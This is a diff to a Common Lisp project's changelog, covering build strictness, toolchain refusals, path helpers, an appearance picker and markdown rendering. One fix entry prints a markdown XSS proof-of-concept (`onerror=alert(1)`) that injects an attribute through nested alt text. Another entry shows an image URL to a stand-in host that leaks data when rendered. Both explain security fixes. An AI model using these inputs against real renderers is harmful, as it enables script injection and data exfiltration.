@@ -123,6 +123,19 @@ its tag.
   `sendgrid-endpoint`.
   **A query or fragment is allowed here**, unlike in a Twilio `api-base`: `deliver` sends this
   value as the request URL exactly as it stands, so nothing can land inside one.
+- **cons: `cons --strict build` and `cons --strict test` now fail when a `defun`, `defmacro`,
+  `defgeneric` or same-specializer `defmethod` in one of the project's files replaces one from
+  another of its files** (#1121). SBCL reports this only as a `STYLE-WARNING`, so the strict
+  build passed while the program ran with whichever file loaded last. The error names the kind
+  of definition, its name and both files. An app whose strict CI build passed before can fail
+  now; rename one of the two definitions, or delete the one that is not meant to be used. A
+  file loaded twice, a library outside the project, and a method on other specializers are not
+  counted, and neither is a definition left in the image by an earlier build, as in a REPL
+  after a function moved files. Setting `uiop:*uninteresting-conditions*` to
+  `uiop:*usual-uninteresting-conditions*` does not hide it. Without `--strict` nothing changes.
+  The tree's own gate (`verify-tree.lisp`,
+  `check-compile.lisp`, through `scripts/redefinitions.lisp`) already failed a cross-file
+  `defun` (#577) and now fails the other three kinds as well.
 
 - **hermes: a 429 from SendGrid or Twilio is now `delivery-rate-limited`, not a plain
   `delivery-failure`** (#79 step two). An app that caught `delivery-failure` still catches it,
@@ -1414,16 +1427,48 @@ its tag.
   the version from the header of `sb-posix.fasl` there at startup. On a mismatch it prints both
   versions, the directory and the rebuild command
   (`sbcl --dynamic-space-size 4096 --script bootstrap.lisp`), then exits 1 before running the
-  target. The built-in commands (`cons version`, `cons help`, `cons setup`, …) and `--fresh`
-  targets still run. Any fatal toolchain finding now stops a target this way, including the
-  existing "contribs cannot be loaded" one. When a contrib fails to load during a target for any
+  target. The built-in commands (`cons version`, `cons help`, `cons setup`, …) still run, and so
+  does a target whose work runs in a subprocess `sbcl`, under the `sbcl` on `PATH`, whose
+  contribs are its own: a Lisp target run with `--fresh` or marked `:isolate t`, and an `:sh`
+  target. A `:steps` target is refused, with or without `--fresh`, when any of its steps does
+  Lisp work, because cons performs the steps in its own image; the refusal names those steps
+  (#1110). Any fatal toolchain finding now stops a target this way, including the existing
+  "contribs cannot be loaded" one. When a contrib fails to load during a target for any
   other reason, `cons` prints where it loads contribs from before the error, or, with no
   `SBCL_HOME`, that it can load only the contribs `bootstrap.lisp` baked in. The stale-image
   warning no longer says that a dumped image carries its own contribs, and says whether it
   could check the contribs on disk. To act: rebuild `bin/cons` after every SBCL upgrade, and on
   macOS or Linux export `SBCL_HOME` if a project needs a contrib `bootstrap.lisp` does not
   bake in. New exports from `cons/toolchain`: `fasl-header-version`, `contrib-version-in`,
-  `contrib-load-failure-p`, `contrib-failure-lines` and `explain-contrib-failure`.
+  `contrib-load-failure-p`, `contrib-failure-lines` and `explain-contrib-failure`; from
+  `cons/run`, `toolchain-refusal`, which decides whether a target is refused.
+
+### Fixed
+
+- **`hyperion/markdown:render` no longer lets an image inside an image's alt text add attributes
+  to the outer `img`** (#1132). An app rendering untrusted markdown **with the default options**
+  was affected, so this is a fix to behaviour that shipped, not to the new untrusted mode. 3bmd
+  renders an image's alt label to HTML and writes the result into `alt="..."` without escaping
+  it, so a nested element put its own markup inside the attribute, the attribute ended at that
+  markup's first quote, and the rest was read as attributes of the outer `img`. The input
+
+  ```
+  ![![x](onerror=alert(1))](outer.png)
+  ```
+
+  produced `<img src="outer.png" alt="<img src="onerror=alert(1)" alt="x" />" />`, which gives
+  the outer image an `onerror` attribute with the unquoted value `alert(1)`; the relative source
+  passes the URL check, and the outer image's source then fails to load, which runs the handler.
+  An emitted image's alt label is now reduced to text and entities, with any nested image or link
+  contributing the text of its label and never its URL. `%label-text` does the reduction. **What
+  an `alt` value looks like now**, since an attribute cannot hold markup:
+
+  - plain text, and an entity such as `&copy;`, are unchanged;
+  - emphasis, code and any other nested markup become the text inside them, so an alt label
+    written `a *b*` gives `alt="a b"` where it gave `alt="a <em>b</em>"`;
+  - a nested image or link becomes the text of its label, and its URL does not appear;
+  - a hard line break becomes a space, so the words around it stay separate words. It wrote a
+    literal `<br/>` into the attribute before.
 
 ### Added
 
@@ -1440,6 +1485,24 @@ its tag.
   between them — a bracketed IPv6 address in the userinfo, a scheme inside the endpoint, and a
   bucket label in front of the host — each a case the other copy's fix had already closed.
 
+- **aion/path: one function for the name the operating system takes for a path** (#1103). The new
+  system `aion/path` exports `native-name`, `directory-pathname`, `separator-p`, `separators` and
+  `native-separator`, the separator written between parts: a backslash on Windows, `/` elsewhere.
+  `native-name` returns a string unchanged and gives a pathname its `uiop:native-namestring`,
+  after a logical pathname is translated; it refuses a wild pathname with an error, and anything
+  else, `nil` included, with `type-error`. `directory-pathname` makes a directory pathname from a
+  native string or a pathname without parsing the name as a Lisp namestring, which
+  `uiop:ensure-directory-pathname` does. As with that function, an empty name, `""` or `#P""`,
+  gives the current folder, and on Windows a drive with nothing after it, such as `C:`, gives that
+  drive's current folder, not its root. aion/fs, aion/uv, aion/libgit and aion/windows each had
+  their own copy of this rule and call `aion/path` now; `aion/uv:native-path` remains, and returns
+  what `aion/path:native-name` does. `aion/path` needs only UIOP, so `scripts/fs.lisp` loads it
+  before aion/fs.
+  - Because the copies are now one function, `aion/fs:delete-tree`, `make-directory-link`,
+    `make-file-link`, `link-p` and `delete-link` accept a logical
+    pathname and translate it, as aion/uv, aion/libgit and aion/windows already did. Before, they
+    signalled an error, because `uiop:native-namestring` refuses a logical pathname. A wild
+    pathname is refused with an error, as before, now with the message `aion/path` gives.
 
 - **`aion/http-client:local-host-p` and `aion/http-client:url-host` are exported** (#1082).
   `local-host-p` takes a host name or an IP address in text and says whether only this machine or
@@ -1463,6 +1526,65 @@ its tag.
   connection follows the resolver. Other non-canonical spellings (`127.1`, `0x7f.0.0.1`,
   `2130706433`) are **kept**, because they go to the system resolver, which is the same resolver
   the connection uses, so there is no second parser to disagree with.
+- **hyperion/kit: an appearance picker for theme, contrast and look** (#981). The new
+  package `hyperion/kit/appearance` has five parts:
+  - `appearance-picker` writes a POST form with three labelled groups of buttons:
+    - theme: System, Light, Dark;
+    - contrast: System, Normal, High;
+    - look: Flat, Gradient.
+
+    Each button is a submit button with `aria-pressed`, so the form works without script. Its
+    text comes from a `:labels` plist, with `*default-picker-labels*` for any key left out.
+    With htmx, the buttons sit in a `<fieldset>` that is disabled while a request is in
+    flight, so a press made then visibly does nothing. Without that, htmx dropped such a press
+    with no sign. `apply-appearance-js` gives focus back to the pressed button when
+    the request ends, since disabling it moves focus to the page body.
+  - `appearance-from-form` reads the posted body. It checks every value against
+    `hyperion/appearance`'s values, and refuses the whole form, returning `nil`, for anything
+    else or for a setting posted twice.
+  - `merge-appearance` puts the change over the visitor's current settings.
+  - `appearance-response-headers` gives the store's `Set-Cookie` and an `HX-Trigger` event,
+    `hy-appearance`.
+  - `apply-appearance-js` is a script for the page that applies that event without a reload. It
+    sets or removes `data-theme`, `data-contrast` and `data-look` on `<html>`, and moves
+    `aria-pressed` in every picker on the page.
+
+  `hyperion/appearance` now exports `*themes*`, `*contrasts*` and `*looks*`, the values each
+  setting allows. The package's comment shows a handler that answers 400 for a refused form,
+  204 with the headers for htmx, and a 303 back to the page otherwise.
+- **praxeon/chat-ui: `composer` takes `:action`, the route its form posts to** (#1117). It
+  defaults to `/api/message`, the route `praxeon/web` serves, so a page that passes nothing
+  posts where it did before. A host app that renders the chat parts in its own page, with its
+  routes under a prefix, scoped to one conversation, or with its own `/api/message`, passes its
+  route instead of mounting its handler at `/api/message`. `:action` must be a string.
+- **`hyperion/markdown:render` takes `:images` and `:links`, for text the app did not write**
+  (#1119, part one). `(render text :images nil :links :text)` renders each image as its alt text
+  and each link as its text, emitting no `img` element and no `href`. **The defaults are
+  unchanged**, so everything rendering trusted content behaves exactly as before.
+  **Why an app wants this for untrusted text.** An image is fetched as soon as it is rendered,
+  with no click, so a reply holding `![x](https://elsewhere.example/?d=...)` makes the reader's
+  machine send that request and whatever the URL carries with it; in a desktop webview with no
+  Content-Security-Policy nothing stops it. And in a desktop webview, following a link replaces
+  the app's own page with the linked one.
+  Both apply to an explicit link or image and to a reference link, and to relative and `mailto`
+  URLs as well as `http` and `https`. **An autolink needs neither option**: in the safe mode 3bmd
+  never builds one, because the angle brackets are escaped as text before it parses, so
+  `<https://host/>` already reaches the output as text — and the only mode that does build one is
+  `:allow-html t`, which these options refuse.
+  - **`render` now signals `hyperion/markdown:render-option-error` in two new cases**, both of
+    them a request it cannot honour:
+    `:allow-html t` passed together with `:images nil` or `:links :text`, and any value for
+    `:images` other than `t` or `nil`, or for `:links` other than `t` or `:text`. Nothing that
+    passes neither new argument can reach either signal, so no existing call changes. It is a
+    named condition rather than a plain `error` so an app can catch this misuse and nothing
+    else: these are mistakes in the call, not failures to render.
+  - `:allow-html t` with either mode is refused because raw HTML is not parsed into the tree
+    these options filter: an `img` or `href` written directly in the source survives them, so
+    `:images nil` would report no image while the output carried one. The two arguments also
+    describe opposite situations — `:allow-html t` is for content the app wrote, these modes for
+    content it did not.
+  - An unrecognised value is refused because the default is the permissive one, so a typo in a
+    security argument must not read as "render everything".
 
 - **hermes: how long a send waits is now hermes's own setting, `*send-connect-timeout*` and
   `*send-read-timeout*`, both 10 seconds** (#1077). Each provider also takes `:connect-timeout`
@@ -3616,6 +3738,21 @@ its tag.
   "Long-running calls".
 
 ### Fixed
+
+- **aion/fs: `make-temporary-directory` takes an `:in` folder given as a string as a native name**
+  (#1103). It passed `:in` through `uiop:ensure-directory-pathname`, which parses a string as a
+  Lisp namestring, so a folder named, for example, `a[1]` named another path or none, and on Linux
+  and macOS a backslash in the name was dropped. The new directory's own name is now added as a
+  directory component rather than parsed.
+- **A macOS desktop bundle relinks a carried library against a dependency that another carry
+  step copied under a different file name** (#1130). `ouranos-carry:relink-bundle`, which runs
+  after the three carry steps in `build-desktop-app.lisp`, matched a load command to a carried
+  file by file name only. A library that records its dependency as `/build/libb.dylib`, while a
+  step carried that dependency as `libb.1.dylib`, kept naming the build machine's path, and on a
+  Mac without it dyld stopped with `Library not loaded`. `ouranos-carry:stamp-install-name` now
+  takes `:source` and records each copy's install name before the stamp and the file it came
+  from, in `ouranos-carry:*carried-origins*`, and `relink-bundle` also matches a load command by
+  those.
 
 - **aion/uv: a path string reaches libuv as written, so a file with a backslash in its name works
   on Linux and macOS** (#1093). Every function that takes a path ran it through `cl:namestring`,
